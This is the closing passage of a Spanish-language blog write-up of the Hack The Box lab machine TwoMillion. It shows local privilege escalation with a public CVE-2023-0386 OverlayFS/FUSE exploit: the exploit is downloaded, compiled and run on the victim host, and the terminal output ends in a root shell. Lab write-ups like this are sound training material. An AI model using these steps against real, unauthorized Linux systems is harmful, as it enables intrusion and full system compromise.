</span></span><span class="line"><span class="cl">I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTB Godfather
</span></span></code></pre></div><p>Buscando por <code>OverlayFS exploit</code> encuentro este exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">https://github.com/xkaneiki/CVE-2023-0386/
</span></span></code></pre></div><p>Me descargo el zip a mi m√°quina, luego subo el zip a la m√°quina v√≠ctima, descomprimo el zip y entro a la carpeta para compilar el exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">admin@2million:/tmp/$ unzip main.zip
</span></span><span class="line"><span class="cl">admin@2million:/tmp/$ cd CVE-2023-0386-main
</span></span><span class="line"><span class="cl">admin@2million:/tmp/CVE-2023-0386-main$ make all
</span></span><span class="line"><span class="cl">admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
</span></span><span class="line"><span class="cl">[+] len of gc: 0x3ee0
</span></span><span class="line"><span class="cl">[+] readdir
</span></span><span class="line"><span class="cl">[+] getattr_callback
</span></span><span class="line"><span class="cl">/file
</span></span><span class="line"><span class="cl">[+] open_callback
</span></span><span class="line"><span class="cl">/file
</span></span><span class="line"><span class="cl">[+] read buf callback
</span></span><span class="line"><span class="cl">offset 0
</span></span><span class="line"><span class="cl">size 16384
</span></span><span class="line"><span class="cl">path /file
</span></span><span class="line"><span class="cl">[+] open_callback
</span></span><span class="line"><span class="cl">/file
</span></span><span class="line"><span class="cl">[+] open_callback
</span></span><span class="line"><span class="cl">/file
</span></span><span class="line"><span class="cl">[+] ioctl callback
</span></span><span class="line"><span class="cl">path /file
</span></span><span class="line"><span class="cl">cmd 0x80086601
</span></span></code></pre></div><p>Desde otra terminal me conecto al sistema, entro en la carpeta del exploit y escribo <code>./exp</code> para obtener el root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">./exp
</span></span><span class="line"><span class="cl">root@2million:/tmp/CVE-2023-0386-main# id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),1000(admin)
</span></span><span class="line"><span class="cl">root@2million:/root#
</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la m√°quina TwoMillion.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
